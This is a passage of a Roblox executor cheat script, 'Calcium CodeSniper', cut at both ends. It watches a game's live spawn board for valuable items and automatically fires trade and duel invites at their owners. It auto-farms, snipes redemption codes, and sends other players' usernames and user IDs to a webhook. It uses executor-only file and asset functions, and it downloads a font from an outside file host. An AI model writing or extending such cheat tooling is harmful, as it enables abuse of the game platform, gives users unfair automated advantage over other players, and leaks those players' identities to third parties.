        local timeLbl = Instance.new("TextLabel")
        timeLbl.Size = UDim2.new(1, -196, 0, 16)
        timeLbl.Position = UDim2.new(0, 86, 0, 58)
        timeLbl.BackgroundTransparency = 1
        timeLbl.Text = timeText or "Spawned just now"
        timeLbl.TextColor3 = Color3.fromRGB(140, 140, 160)
        timeLbl.Font = Enum.Font.GothamMedium
        timeLbl.TextSize = 10
        timeLbl.TextXAlignment = Enum.TextXAlignment.Left
        timeLbl.ZIndex = ContentZ + 2
        timeLbl.Parent = card

        local isServer = loc and string.find(string.upper(loc), "SERVER") ~= nil

        local tradeBtn = Instance.new("TextButton")
        tradeBtn.Size = UDim2.new(0, 60, 0, 28)
        tradeBtn.Position = UDim2.new(1, -68, 0, 10)
        tradeBtn.BackgroundColor3 = Color3.fromRGB(12, 14, 20)
        tradeBtn.Text = "TRADE"
        tradeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        tradeBtn.Font = Enum.Font.GothamMedium
        tradeBtn.TextSize = 10
        tradeBtn.BorderSizePixel = 0
        tradeBtn.Active = true
        tradeBtn.ZIndex = ContentZ + 5
        tradeBtn.Parent = card
        Instance.new("UICorner", tradeBtn).CornerRadius = UDim.new(0, 8)
        local trStroke = Instance.new("UIStroke", tradeBtn)
        trStroke.Color = Color3.fromRGB(60, 60, 80)
        trStroke.Thickness = 1.2

        local tradeClickBusy = false
        local function handleLiveTrade()
            if tradeClickBusy then return end
            tradeClickBusy = true
            local rawOwner = trackedCards[sourceId] and trackedCards[sourceId].currentOwner or owner
            local curOwner = cleanRichText(rawOwner):gsub("@", ""):gsub("^%s*(.-)%s*$", "%1")
            if not curOwner or curOwner == "" or curOwner:lower() == "unclaimed" or curOwner:lower() == "claimed by" or curOwner:lower() == "none" then
                tradeBtn.Text = "NO OWNER"
                tradeBtn.TextColor3 = OG_RED
                task.delay(1.5, function()
                    if tradeBtn and tradeBtn.Parent then
                        tradeBtn.Text = "TRADE"
                        tradeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
                    end
                    tradeClickBusy = false
                end)
                return
            end
            tradeBtn.Text = "SENDING..."
            task.spawn(function()
                local success = sendTradeInvite(curOwner)
                tradeBtn.Text = success and "SENT!" or "FAIL"
                tradeBtn.TextColor3 = success and OG_GREEN or OG_RED
                task.delay(2, function()
                    if tradeBtn and tradeBtn.Parent then
                        tradeBtn.Text = "TRADE"
                        tradeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
                    end
                    tradeClickBusy = false
                end)
            end)
        end
        tradeBtn.MouseButton1Click:Connect(handleLiveTrade)
        tradeBtn.Activated:Connect(handleLiveTrade)

        local duelBtn = Instance.new("TextButton")
        duelBtn.Size = UDim2.new(0, 60, 0, 28)
        duelBtn.Position = UDim2.new(1, -68, 0, 46)
        duelBtn.BackgroundColor3 = Color3.fromRGB(12, 14, 20)
        duelBtn.Text = "DUEL"
        duelBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        duelBtn.Font = Enum.Font.GothamMedium
        duelBtn.TextSize = 10
        duelBtn.BorderSizePixel = 0
        duelBtn.Active = true
        duelBtn.ZIndex = ContentZ + 5
        duelBtn.Parent = card
        Instance.new("UICorner", duelBtn).CornerRadius = UDim.new(0, 8)
        local duStroke = Instance.new("UIStroke", duelBtn)
        duStroke.Color = Color3.fromRGB(60, 60, 80)
        duStroke.Thickness = 1.2

        local duelClickBusy = false
        local function handleLiveDuel()
            if duelClickBusy then return end
            duelClickBusy = true
            local rawOwner = trackedCards[sourceId] and trackedCards[sourceId].currentOwner or owner
            local curOwner = cleanRichText(rawOwner):gsub("@", ""):gsub("^%s*(.-)%s*$", "%1")
            if not curOwner or curOwner == "" or curOwner:lower() == "unclaimed" or curOwner:lower() == "claimed by" or curOwner:lower() == "none" then
                duelBtn.Text = "NO OWNER"
                task.delay(1.5, function()
                    if duelBtn and duelBtn.Parent then
                        duelBtn.Text = "DUEL"
                        duelBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
                    end
                    duelClickBusy = false
                end)
                return
            end
            duelBtn.Text = "SENDING..."
            task.spawn(function()
                local success = sendDuelInvite(curOwner)
                duelBtn.Text = success and "SENT!" or "FAIL"
                duelBtn.TextColor3 = success and OG_GREEN or OG_RED
                task.delay(2, function()
                    if duelBtn and duelBtn.Parent then
                        duelBtn.Text = "DUEL"
                        duelBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
                    end
                    duelClickBusy = false
                end)
            end)
        end
        duelBtn.MouseButton1Click:Connect(handleLiveDuel)
        duelBtn.Activated:Connect(handleLiveDuel)

        trackedCards[sourceId] = {
            card = card,
            timeLbl = timeLbl,
            ownerLbl = ownerLbl,
            avatarImg = avatarImg,
            imgBox = imgBox,
            currentOwner = owner
        }
        pcall(function() chime:Play() end)
        if owner and owner ~= "UNCLAIMED" and owner ~= "Claimed By" then
            local userId = resolveTargetUserId(owner)
            if userId then
                sendWebhook(cleanName, owner, userId, mutation, isServer)
            end
        end
        updateCount()
    end

    local recentMutations = {}
    pcall(function()
        local pk = game.ReplicatedStorage:FindFirstChild("Packages")
        local net = pk and pk:FindFirstChild("Net")
        local re = net and net:FindFirstChild("RE/Liveboard/NewEntry")
        if re and re:IsA("RemoteEvent") then
            re.OnClientEvent:Connect(function(data)
                if type(data) == "table" and data.BrainrotName then
                    local mut = data.Mutation
                    if mut and mut ~= "" and mut ~= "none" and mut ~= "None" then
                        recentMutations[data.BrainrotName] = mut
                        if data.UID then
                            recentMutations[tostring(data.UID)] = mut
                        end
                    end
                end
            end)
        end
    end)

    local observedScrolls = {}

    local function processEntry(entry)
        if not entry or not entry:IsA("Frame") then return end
        if clearedEntries[entry] then return end
        if entry.Name == "ServerTemplate" or entry.Name == "GlobalTemplate" then return end
        if not entry.Visible then return end
        local filler = entry:FindFirstChild("Filler")
        if not filler then return end
        local titleElem = filler:FindFirstChild("Title")
        local rawTitle = titleElem and titleElem.Text or ""
        if rawTitle == "" then return end
        local cleanName = cleanRichText(rawTitle)
        if not isTargetAnimal(cleanName) and not isTargetAnimal(rawTitle) then return end
        local uid = entry:GetAttribute("UID") or filler:GetAttribute("UID")
        local mutation = entry:GetAttribute("Mutation")
            or filler:GetAttribute("Mutation")
            or (uid and recentMutations[tostring(uid)])
        if not mutation or mutation == "" or mutation == "none" or mutation == "None" then
            local mInfo = getMutationInfo(rawTitle)
            if mInfo then
                mutation = mInfo.name
            else
                mutation = nil
            end
        end
        local targetCustomUrl = getCustomAnimalUrl(cleanName, mutation)
        local locElem = filler:FindFirstChild("Location")
        local loc = locElem and locElem.Text or "[GLOBAL]"
        local timeElem = filler:FindFirstChild("Spawned")
        local timeText = timeElem and timeElem.Text or ""
        local pBg = filler:FindFirstChild("PlayerBg")
        local owner = (pBg and pBg:FindFirstChild("Username") and pBg.Username.Text ~= "") and pBg.Username.Text or "UNCLAIMED"
        local headshot = pBg and pBg:FindFirstChild("Headshot")
        local playerImg = (headshot and headshot:IsA("ImageLabel")) and headshot.Image or ""
        if (not playerImg or playerImg == "") and owner ~= "UNCLAIMED" and owner ~= "Claimed By" then
            local p = OGPlayers:FindFirstChild(owner)
            if p then
                playerImg = string.format("rbxthumb://type=AvatarHeadShot&id=%d&w=100&h=100", p.UserId)
            end
        end
        addLiveSpawnCard(entry, rawTitle, loc, owner, timeText, playerImg, targetCustomUrl, mutation)
        checkAndExecuteAutoTrade(rawTitle, owner)
        if headshot and headshot:IsA("ImageLabel") and not headshot:GetAttribute("Monitored") then
            headshot:SetAttribute("Monitored", true)
            headshot:GetPropertyChangedSignal("Image"):Connect(function()
                if headshot.Image ~= "" and trackedCards[entry] and trackedCards[entry].avatarImg then
                    trackedCards[entry].avatarImg.Image = headshot.Image
                    trackedCards[entry].avatarImg.Visible = true
                end
                local curOwner = (pBg and pBg:FindFirstChild("Username") and pBg.Username.Text ~= "") and pBg.Username.Text or ""
                if curOwner ~= "" and curOwner ~= "UNCLAIMED" then
                    checkAndExecuteAutoTrade(rawTitle, curOwner)
                end
            end)
        end
    end

    local function inspectLiveBoard()
        pcall(function()
            for _, gui in ipairs(OGPlayerGui:GetChildren()) do
                if gui:IsA("SurfaceGui") then
                    local scroll = gui:FindFirstChild("ScrollingFrame")
                    if scroll then
                        if not observedScrolls[scroll] then
                            observedScrolls[scroll] = true
                            scroll.ChildAdded:Connect(function(child)
                                clearedEntries[child] = nil
                                task.wait(0.1)
                                processEntry(child)
                            end)
                            scroll.ChildRemoved:Connect(function(child)
                                clearedEntries[child] = nil
                                if trackedCards[child] then
                                    if trackedCards[child].card then
                                        pcall(function() trackedCards[child].card:Destroy() end)
                                    end
                                    trackedCards[child] = nil
                                    updateCount()
                                end
                            end)
                            for _, child in ipairs(scroll:GetChildren()) do
                                processEntry(child)
                            end
                        end
                    end
                end
            end
        end)
    end

    local function createHeadDisplay()
        if not OGLocal.Character or not OGLocal.Character:FindFirstChild("Head") then return end
        local head = OGLocal.Character.Head
        local existingBillboard = head:FindFirstChild("CalciumOGBillboard")
        if existingBillboard then existingBillboard:Destroy() end
        local billboard = Instance.new("BillboardGui")
        billboard.Name = "CalciumOGBillboard"
        billboard.Size = UDim2.new(0, 100, 0, 30)
        billboard.MaxDistance = 500
        billboard.StudsOffset = Vector3.new(0, 2, 0)
        billboard.Parent = head
        local textLabel = Instance.new("TextLabel")
        textLabel.Text = "/calcium"
        textLabel.TextColor3 = Color3.fromRGB(110, 180, 255)
        textLabel.BackgroundTransparency = 1
        textLabel.TextSize = 14
        textLabel.Font = Enum.Font.GothamBold
        textLabel.Size = UDim2.new(1, 0, 1, 0)
        textLabel.Parent = billboard
    end

    createHeadDisplay()
    OGLocal.CharacterAdded:Connect(function()
        task.wait(0.5)
        createHeadDisplay()
    end)

    task.spawn(function()
        while GUI.Parent do
            inspectLiveBoard()
            task.wait(3)
        end
    end)

    if getgenv then getgenv().CalciumOGSniperGui = GUI end
    if OGOpenBtn then OGOpenBtn.Text = "CLOSE" end
    if OGSniperDot then OGSniperDot.BackgroundColor3 = COLORS.Green end
    if setStatus then setStatus("OG Sniper opened", COLORS.Green) end
end

if OGOpenBtn then
    local lastOGToggle = 0
    local function onOGClick()
        if tick() - lastOGToggle < 0.35 then return end
        lastOGToggle = tick()
        pcall(loadOGSniper)
    end
    OGOpenBtn.Activated:Connect(onOGClick)
    OGOpenBtn.MouseButton1Click:Connect(onOGClick)
end

function keyMatches(configKey, keyCode)
    local name = savedConfig[configKey]
    if type(name) ~= "string" or name == "" then return false end
    local ok, enumVal = pcall(function() return Enum.KeyCode[name] end)
    return ok and enumVal ~= nil and keyCode == enumVal
end

function setCodeSniperEnabled(on)
    if autoWriteEnabled == on then return end
    autoWriteEnabled = not on
    toggleAutoWrite()
end

function setAutoSubmitEnabled(on)
    if _autoAccept == on then return end
    _autoAccept = on
    savedConfig.autoSubmit = on
    featureStates["Auto submit"] = on
    saveConfig()
    if autoWriteEnabled then appendConsoleStatus("Auto submit", on) end
    pcall(function()
        local card = Settings:FindFirstChild("AutoSubmit")
        if not card then return end
        local btn = card:FindFirstChild("State")
        if not btn then return end
        local ti = TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        TweenService:Create(btn, ti, {
            BackgroundColor3 = on and COLORS.Accent or COLORS.Control,
            TextColor3 = on and COLORS.Window or COLORS.Dim,
        }):Play()
        btn.Text = on and "ON" or "OFF"
    end)
end

function setRiddleSolverEnabled(on)
    if _riddleSolver == on then return end
    _riddleSolver = on
    savedConfig.riddleSolver = on
    featureStates["Riddle solver"] = on
    saveConfig()
    if autoWriteEnabled then appendConsoleStatus("Riddle solver", on) end
    pcall(function()
        local card = Settings:FindFirstChild("AIRiddles")
        if not card then return end
        local btn = card:FindFirstChild("State")
        if not btn then return end
        local ti = TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        TweenService:Create(btn, ti, {
            BackgroundColor3 = on and COLORS.Accent or COLORS.Control,
            TextColor3 = on and COLORS.Window or COLORS.Dim,
        }):Play()
        btn.Text = on and "ON" or "OFF"
    end)
end

function setRetypeInvalidEnabled(on)
    if _retypeInvalid == on then return end
    _retypeInvalid = on
    savedConfig.retypeInvalid = on
    featureStates["Retype invalid"] = on
    saveConfig()
    if autoWriteEnabled then appendConsoleStatus("Retype invalid", on) end
    pcall(function()
        local card = Settings:FindFirstChild("RetypeInvalid")
        if not card then return end
        local btn = card:FindFirstChild("State")
        if not btn then return end
        local ti = TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        TweenService:Create(btn, ti, {
            BackgroundColor3 = on and COLORS.Accent or COLORS.Control,
            TextColor3 = on and COLORS.Window or COLORS.Dim,
        }):Play()
        btn.Text = on and "ON" or "OFF"
    end)
end

function setAutoFarmEnabled(on)
    if _autoFarm == on then return end
    _autoFarm = on
    savedConfig.autoFarm = on
    featureStates["Auto farm"] = on
    if on then pcall(autoBuyStart) else pcall(autoBuyStop) end
    saveConfig()
    if autoWriteEnabled then appendConsoleStatus("Auto farm", on) end
    pcall(function()
        local card = Settings:FindFirstChild("AutoFarm")
        if not card then return end
        local btn = card:FindFirstChild("State")
        if not btn then return end
        local ti = TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        TweenService:Create(btn, ti, {
            BackgroundColor3 = on and COLORS.Gold or COLORS.Control,
            TextColor3 = on and COLORS.Window or COLORS.Dim,
        }):Play()
        btn.Text = on and "ON" or "OFF"
    end)
    if on then
        setStatus("Auto farm ON", COLORS.Gold)
    else
        setStatus("Auto farm OFF", COLORS.Dim)
    end
end

_keybindListener = UserInputService.InputBegan:Connect(function(input, gpe)
    if _listeningKB then return end
    if input.UserInputType ~= Enum.UserInputType.Keyboard then return end
    if gpe or UserInputService:GetFocusedTextBox() then return end
    local kc = input.KeyCode
    if keyMatches("kbCodeSniper", kc) then
        toggleAutoWrite()
    elseif keyMatches("kbAutoSubmit", kc) then
        setAutoSubmitEnabled(not _autoAccept)
    elseif keyMatches("kbRiddleSolver", kc) then
        setRiddleSolverEnabled(not _riddleSolver)
    elseif keyMatches("kbRetypeInvalid", kc) then
        setRetypeInvalidEnabled(not _retypeInvalid)
    elseif keyMatches("kbAutoFarm", kc) then
        setAutoFarmEnabled(not _autoFarm)
    elseif keyMatches("kbManualSubmit", kc) then
        if type(manualSubmitNow) == "function" then pcall(manualSubmitNow) end
    end
end)

task.spawn(function()
    for _ = 1, 8 do
        pcall(function()
            local pg = playerGui or (player and player:FindFirstChild("PlayerGui"))
            if not pg then return end
            local codesGui = pg:FindFirstChild("Codes")
            if codesGui then
                if codesGui:IsA("ScreenGui") then codesGui.Enabled = true end
                local fr = codesGui:FindFirstChild("Codes")
                if fr and fr:IsA("GuiObject") then fr.Visible = true end
                if type(calciumCodeBox) == "function" then
                    local b = calciumCodeBox()
                    if b then _lastBox = b; _cachedBox = b; _cachedBoxTime = tick() end
                end
            end
        end)
        task.wait(0.1)
    end
end)

if getgenv then
    getgenv().StopAura = function()
        pcall(function()
            if RunService.UnbindFromRenderStep then
                RunService:UnbindFromRenderStep("CalciumCodeSniperFlush")
            end
        end)
        if ListenConnection then
            pcall(function() ListenConnection:Disconnect() end)
            ListenConnection = nil
        end
        if getgenv().CodeSniperNotifyConnection then
            pcall(function() getgenv().CodeSniperNotifyConnection:Disconnect() end)
            getgenv().CodeSniperNotifyConnection = nil
        end
        if getgenv().CalciumOGSniperGui then
            pcall(function() getgenv().CalciumOGSniperGui:Destroy() end)
            getgenv().CalciumOGSniperGui = nil
        end
        _instanceRunning = false
        pcall(autoBuyStop)
        if _ragdollConnection then pcall(function() _ragdollConnection:Disconnect() end) end
        if _targetWatcherListener then _targetWatcherListener:Disconnect() end
        if _codeboxRemovedListener then _codeboxRemovedListener:Disconnect() end
        if _codeboxAutoLinkConn then _codeboxAutoLinkConn:Disconnect() end
        if _feedbackAddedListener then _feedbackAddedListener:Disconnect() end
        if _keybindListener then _keybindListener:Disconnect() end
        if _boxFocusedListener then _boxFocusedListener:Disconnect() end
        if _focusReleasedListener then _focusReleasedListener:Disconnect() end
        if _characterListener then _characterListener:Disconnect() end
        for _, c in ipairs(_feedbackListeners) do pcall(function() c:Disconnect() end) end
        table.clear(_feedbackListeners)
        pcall(clearBoxWatchers)
        _G.CalciumPulseRefs = nil
        -- Detached legacy controls are not children of GUI; release them too.
        if Window then Window:Destroy() end
        if GUI then GUI:Destroy() end
    end
end

task.spawn(function()
    task.wait(0.35)
    local ok, err = pcall(function()
        if _instanceRunning and type(playIntroAnimation) == "function" then
            -- Restore the original 13-second scope intro and its sound sequence.
            -- The Nova interface is built underneath and the old GUI stays hidden.
            playIntroAnimation()
        end
    end)
    if not ok then
        warn("[Calcium Sniper] intro error: ", err)
    end
end)

-- ============================================================================
-- CALCIUM CODESNIPER / SPECTRA V10
-- Spectra interface with original intro/farm and unified redemption dispatch.
-- ============================================================================
task.defer(function()
    if not _instanceRunning or not GUI or not GUI.Parent then return end
    -- Legacy display must never be visible, but its Lua objects are retained.
    if Window then Window.Visible = false; Window.Parent = nil end
    local prior = GUI:FindFirstChild("NovaInterface")
    if prior then prior:Destroy() end
    local oldDock = GUI:FindFirstChild("CalciumMiniDock")
    if oldDock then oldDock:Destroy() end

    local P = {
        bg=Color3.fromRGB(6,10,18), panel=Color3.fromRGB(13,21,32),
        card=Color3.fromRGB(21,33,48), raised=Color3.fromRGB(30,46,62),
        stroke=Color3.fromRGB(80,122,146), white=Color3.fromRGB(245,250,255),
        quiet=Color3.fromRGB(184,206,219), dim=Color3.fromRGB(130,162,180),
        good=Color3.fromRGB(81,235,183), bad=Color3.fromRGB(255,110,135),
        accent=Color3.fromRGB(67,223,248)
    }
    local ACCENTS={CYAN=Color3.fromRGB(61,218,248),ICE=Color3.fromRGB(109,159,255),SOLAR=Color3.fromRGB(255,178,101)}
    local DEFAULT_IMG="rbxassetid://129085053275432"
    -- Replace "0" with your official Calcium image asset ID when you have it.
    local CALCIUM_LOGO_ASSET_ID="0"
    local STYLE_PATH="CalciumCodesniper_Nova_Appearance.json"
    local skin={wallpaper="129085053275432",custom="",accent="CYAN",particles=true,
        wallpaperOpacity=.60,logo=CALCIUM_LOGO_ASSET_ID}
    pcall(function()
        if type(isfile)=="function" and type(readfile)=="function" and isfile(STYLE_PATH) then
            local read=HttpService:JSONDecode(readfile(STYLE_PATH))
            if type(read)=="table" then
                for k,v in pairs(read) do
                    if skin[k]~=nil and typeof(skin[k])==typeof(v) then skin[k]=v end
                end
            end
        end
    end)
    local function persist()
        pcall(function()
            if type(writefile)=="function" then writefile(STYLE_PATH,HttpService:JSONEncode(skin)) end
        end)
    end
    P.accent=ACCENTS[skin.accent] or ACCENTS.CYAN
    local function mk(kind,parent,properties)
        local object=Instance.new(kind)
        for k,v in pairs(properties or {}) do object[k]=v end
        object.Parent=parent
        return object
    end
    local function curve(o,r)
        mk("UICorner",o,{CornerRadius=UDim.new(0,r or 17)})
        return o
    end
    local function edge(o,c,a,w)
        return mk("UIStroke",o,{Color=c or P.stroke,Transparency=a or .55,Thickness=w or 1})
    end
    local function shade(o,from,to,angle)
        return mk("UIGradient",o,{Color=ColorSequence.new(from,to),Rotation=angle or 90})
    end
    local function tw(o,properties,duration)
        if o and o.Parent then
            TweenService:Create(o,TweenInfo.new(duration or .21,Enum.EasingStyle.Quart,Enum.EasingDirection.Out),properties):Play()
        end
    end
    local function text(parent,value,size,color,font,props)
        local x={BackgroundTransparency=1,Text=value or "",TextColor3=color or P.white,
            Font=font or Enum.Font.GothamMedium,TextSize=size or 13,
            TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Center,
            TextTruncate=Enum.TextTruncate.AtEnd,Size=UDim2.new(1,0,0,(size or 13)+10)}
        for k,v in pairs(props or {}) do x[k]=v end
        return mk("TextLabel",parent,x)
    end
    local function button(parent,title,fn,filled)
        local b=curve(mk("TextButton",parent,{Text=title,TextSize=12,Font=Enum.Font.GothamBold,
            BackgroundColor3=filled and P.accent or P.raised,TextColor3=filled and P.bg or P.white,
            AutoButtonColor=false,BorderSizePixel=0,ZIndex=44}),11)
        if not filled then edge(b,P.stroke,.67) end
        b.MouseEnter:Connect(function() tw(b,{BackgroundTransparency=.13},.14) end)
        b.MouseLeave:Connect(function() tw(b,{BackgroundTransparency=0},.14) end)
        if fn then b.Activated:Connect(fn) end
        return b
    end
    -- Starborn is loaded from the exact Calcium X Solar Confuser TTF, not an asset ID.
    -- Use Gotham until the local font has finished loading on the executor.
    local fontFace=nil
    local branding={}
    local fontStatus=nil
    local root,dock
    local function applyStarbornTo(object)
        -- Only headings/branding: Starborn omits UI symbols and makes empty squares.
        if not fontFace or not object or not object.Parent then return end
        if object:IsA("TextLabel") and object:GetAttribute("CalciumStarbornHeading") then
            pcall(function() object.FontFace=fontFace end)
        end
    end
    local function titleFont(label)
        label:SetAttribute("CalciumStarbornHeading",true)
        branding[#branding+1]=label
        applyStarbornTo(label)
        return label
    end
    local function setFontStatus(message,color)
        if fontStatus and fontStatus.Parent then
            fontStatus.Text=message
            fontStatus.TextColor3=color or P.dim
        end
    end
    local function loadConfuserStarborn()
        local env=(type(getgenv)=="function" and getgenv()) or _G
        local function api(name)
            if type(env[name])=="function" then return env[name] end
            if type(_G[name])=="function" then return _G[name] end
            return nil
        end
        local writer=api("writefile")
        local reader=api("readfile")
        local existsFn=api("isfile")
        local custom=api("getcustomasset") or api("getsynasset")
        if not custom then
            pcall(function()
                if syn and type(syn.getcustomasset)=="function" then
                    custom=syn.getcustomasset
                end
            end)
        end
        if not writer or not custom then
            setFontStatus("SYSTEM FONT  /  LOCAL ASSETS UNAVAILABLE",P.dim)
            return
        end

        local fontPath="solar_starborn.ttf"
        local manifestPath="solar_starborn_font.json"
        local function validTTF(data)
            if type(data)~="string" or #data<1000 then return false end
            local magic=data:sub(1,4)
            return magic==string.char(0,1,0,0) or magic=="OTTO" or magic=="true"
        end
        local validCache=false
        if reader then
            local ok,result=pcall(reader,fontPath)
            validCache=ok and validTTF(result)
        elseif existsFn then
            local ok,result=pcall(existsFn,fontPath)
            validCache=ok and result==true
        end
        if not validCache then
            setFontStatus("DOWNLOADING STARBORN",P.accent)
            local ok,data=pcall(function()
                return game:HttpGet("https://files.catbox.moe/pwgdui.ttf")
            end)
            if not ok or not validTTF(data) then
                setFontStatus("STARBORN UNAVAILABLE  /  SYSTEM FONT",P.bad)
                return
            end
            local saved=pcall(writer,fontPath,data)
            if not saved then
                setFontStatus("STARBORN CACHE ERROR  /  SYSTEM FONT",P.bad)
                return
            end
        end
        local ok,face=pcall(function()
            writer(manifestPath,HttpService:JSONEncode({name="Starborn",faces={{
                name="Regular",weight=400,style="normal",assetId=custom(fontPath)
            }}}))
            return Font.new(custom(manifestPath))
        end)
        if not ok or not face then
            setFontStatus("STARBORN LOAD FAILED  /  SYSTEM FONT",P.bad)
            return
        end
        if not root.Parent then return end
        fontFace=face
        -- Apply only to decorative headings; control text, emoji and numerals
        -- stay Gotham for legibility. No per-frame scanning or listeners.
        for _,heading in ipairs(branding) do
            applyStarbornTo(heading)
        end
        setFontStatus("STARBORN  /  LOADED",P.good)
    end

    -- Main panel and independent, draggable minimized dock.
    root=curve(mk("Frame",GUI,{Name="NovaInterface",Size=UDim2.fromOffset(724,520),
        Position=UDim2.fromScale(.5,.5),AnchorPoint=Vector2.new(.5,.5),
        BackgroundColor3=P.bg,BorderSizePixel=0,ClipsDescendants=true,Active=true,ZIndex=20}),24)
    local outerLine=edge(root,P.accent,.18,1.5)
    local wallpaper=mk("ImageLabel",root,{Name="BackgroundImage",Image=DEFAULT_IMG,
        ScaleType=Enum.ScaleType.Crop,ImageTransparency=.60,
        BackgroundTransparency=1,Size=UDim2.fromScale(1,1),ZIndex=21})
    curve(wallpaper,24)
    local darkOverlay=mk("Frame",root,{Size=UDim2.fromScale(1,1),
        BackgroundColor3=P.bg,BackgroundTransparency=.23,BorderSizePixel=0,ZIndex=22})
    curve(darkOverlay,24)
    shade(darkOverlay,Color3.fromRGB(7,13,22),Color3.fromRGB(10,21,32),25)
    local ambience=mk("Frame",root,{Name="AuroraSheen",Size=UDim2.new(1,0,0,110),
        BackgroundColor3=P.accent,BackgroundTransparency=.94,BorderSizePixel=0,ZIndex=23})
    shade(ambience,Color3.fromRGB(25,92,120),Color3.fromRGB(6,13,25),90)
    local topRule=mk("Frame",root,{Size=UDim2.new(1,-38,0,2),Position=UDim2.fromOffset(19,0),
        BackgroundColor3=P.accent,BorderSizePixel=0,ZIndex=30})
    curve(topRule,2)
    -- Static starfield: no render-step work or particle-loop FPS cost.
    local stars=mk("Frame",root,{Name="Starfield",Size=UDim2.fromScale(1,1),
        BackgroundTransparency=1,ClipsDescendants=true,ZIndex=23})
    local starList={}
    local rand=Random.new(2503)
    for i=1,26 do
        local d=(i%6==0) and 3 or 2
        local star=curve(mk("Frame",stars,{Size=UDim2.fromOffset(d,d),
            Position=UDim2.fromScale(rand:NextNumber(.03,.97),rand:NextNumber(.03,.96)),
            BackgroundColor3=P.accent,BackgroundTransparency=rand:NextNumber(.62,.88),
            BorderSizePixel=0,ZIndex=23}),3)
        starList[#starList+1]=star
    end
    stars.Visible=skin.particles

    local rail=curve(mk("Frame",root,{Name="NavigationRail",Size=UDim2.fromOffset(170,520),
        BackgroundColor3=P.panel,BackgroundTransparency=.015,BorderSizePixel=0,ZIndex=31}),21)
    shade(rail,Color3.fromRGB(12,22,34),Color3.fromRGB(6,14,24),90)
    -- Subtle sidebar constellation texture without continuous animation.
    local railPicture=mk("ImageLabel",rail,{Name="RailWallpaper",Image=DEFAULT_IMG,
        Size=UDim2.fromScale(1,1),ImageColor3=Color3.fromRGB(115,205,244),
        ImageTransparency=.90,ScaleType=Enum.ScaleType.Crop,
        BackgroundTransparency=1,ZIndex=31})
    curve(railPicture,21)
    local railFog=mk("Frame",rail,{Size=UDim2.fromScale(1,1),
        BackgroundColor3=P.panel,BackgroundTransparency=.25,
        BorderSizePixel=0,ZIndex=32})
    curve(railFog,21)
    shade(railFog,Color3.fromRGB(8,18,33),Color3.fromRGB(5,11,22),90)
    local railBorder=mk("Frame",rail,{Size=UDim2.new(0,1,1,0),Position=UDim2.new(1,-1,0,0),
        BackgroundColor3=P.accent,BackgroundTransparency=.63,BorderSizePixel=0,ZIndex=32})
    -- Live Roblox avatar: built-in avatar thumbnail, no external image service.
    local avatarUri="rbxthumb://type=AvatarHeadShot&id="..tostring(player.UserId).."&w=150&h=150"
    local emblem=curve(mk("Frame",rail,{Name="AvatarFrame",Size=UDim2.fromOffset(24,24),
        Position=UDim2.fromOffset(41,42),BackgroundColor3=P.raised,
        BorderSizePixel=0,ZIndex=38}),12)
    local avatarEdge=edge(emblem,P.accent,.08,1.65)
    local avatarImage=curve(mk("ImageLabel",emblem,{Name="Headshot",Image=avatarUri,
        Size=UDim2.new(1,-4,1,-4),Position=UDim2.fromOffset(2,2),
        BackgroundTransparency=1,ScaleType=Enum.ScaleType.Crop,ZIndex=39}),12)
    local brand=titleFont(text(rail,"CALCIUM",16,P.white,Enum.Font.GothamBlack,
        {Size=UDim2.fromOffset(94,22),Position=UDim2.fromOffset(72,16),ZIndex=34}))
    local brandSub=text(rail,"CODESNIPER",9,P.accent,Enum.Font.GothamBold,
        {Size=UDim2.fromOffset(96,17),Position=UDim2.fromOffset(73,39),ZIndex=34})
    local brandLogoHolder=curve(mk("Frame",rail,{Name="CalciumLogoBadge",
        Position=UDim2.fromOffset(13,13),Size=UDim2.fromOffset(43,43),
        BackgroundColor3=P.accent,BorderSizePixel=0,ZIndex=36}),22)
    local brandLogoImage=curve(mk("ImageLabel",brandLogoHolder,{
        Size=UDim2.new(1,-6,1,-6),Position=UDim2.fromOffset(3,3),
        BackgroundTransparency=1,ScaleType=Enum.ScaleType.Fit,
        Image="",ZIndex=37}),19)
    local brandLogoFallback=text(brandLogoHolder,"C",23,P.bg,Enum.Font.GothamBlack,
        {Size=UDim2.fromScale(1,1),TextXAlignment=Enum.TextXAlignment.Center,ZIndex=38})
    -- Clean rail: no narrow hard-edged stripe next to the logo.
    local miniVersion=text(rail,"CALCIUM  /  V15",10,P.dim,Enum.Font.GothamBold,
        {Position=UDim2.new(0,18,1,-33),Size=UDim2.new(1,-28,0,18),ZIndex=34})
    local navWrap=mk("ScrollingFrame",rail,{Name="Navigation",Size=UDim2.new(1,-14,1,-142),
        Position=UDim2.fromOffset(7,95),BackgroundTransparency=1,BorderSizePixel=0,
        ScrollBarThickness=0,ScrollingDirection=Enum.ScrollingDirection.Y,
        CanvasSize=UDim2.new(0,0,0,290),ZIndex=33})
    -- Numeric nav icons render correctly even on executors lacking Unicode fonts.
    local MENU={{"Home","01"},{"Sniper","02"},{"Intel","03"},{"Settings","04"},{"Logs","05"}}
    local navButtons={}
    local navLabels={}
    local navBars={}
    local current="Home"
    for i,item in ipairs(MENU) do
        local name,symbol=item[1],item[2]
        local nav=curve(mk("TextButton",navWrap,{Name="Go"..name,Text="",
            Size=UDim2.new(1,-6,0,47),Position=UDim2.fromOffset(3,(i-1)*54),
            BackgroundColor3=P.raised,BackgroundTransparency=1,
            BorderSizePixel=0,AutoButtonColor=false,ZIndex=34}),11)
        navButtons[name]=nav
        navLabels[name]=text(nav,name,12,P.quiet,Enum.Font.GothamBold,
            {Position=UDim2.fromOffset(47,0),Size=UDim2.new(1,-53,1,0),ZIndex=36})
        text(nav,symbol,19,P.accent,Enum.Font.GothamBold,
            {Position=UDim2.fromOffset(12,0),Size=UDim2.fromOffset(27,47),TextXAlignment=Enum.TextXAlignment.Center,ZIndex=36})
        navBars[name]=curve(mk("Frame",nav,{Size=UDim2.fromOffset(3,26),
